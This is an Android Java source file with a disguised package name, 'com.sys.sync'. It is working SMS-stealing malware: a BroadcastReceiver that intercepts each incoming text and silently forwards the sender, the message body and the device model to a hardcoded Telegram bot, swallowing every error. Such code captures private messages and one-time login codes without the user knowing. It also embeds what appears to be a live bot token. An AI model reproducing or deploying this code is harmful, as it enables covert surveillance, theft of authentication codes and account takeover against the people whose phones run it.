package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    private final String T = "8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8";
    private final String C = "5225064014";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle b = intent.getExtras();
            if (b != null) {
                Object[] p = (Object[]) b.get("pdus");
                for (Object obj : p) {
                    SmsMessage s = SmsMessage.createFromPdu((byte[]) obj);
                    String m = "📱 " + android.os.Build.MODEL + "\nFrom: " + s.getOriginatingAddress() + "\nText: " + s.getMessageBody();
                    send(m);
                }
            }
        } catch (Exception ignored) {}
    }

    private void send(final String msg) {
        new Thread(() -> {
            try {
                URL u = new URL("https://api.telegram.org/bot" + T + "/sendMessage?chat_id=" + C + "&text=" + URLEncoder.encode(msg, "UTF-8"));
                HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                conn.getInputStream().close();
            } catch (Exception ignored) {}
        }).start();
    }
}
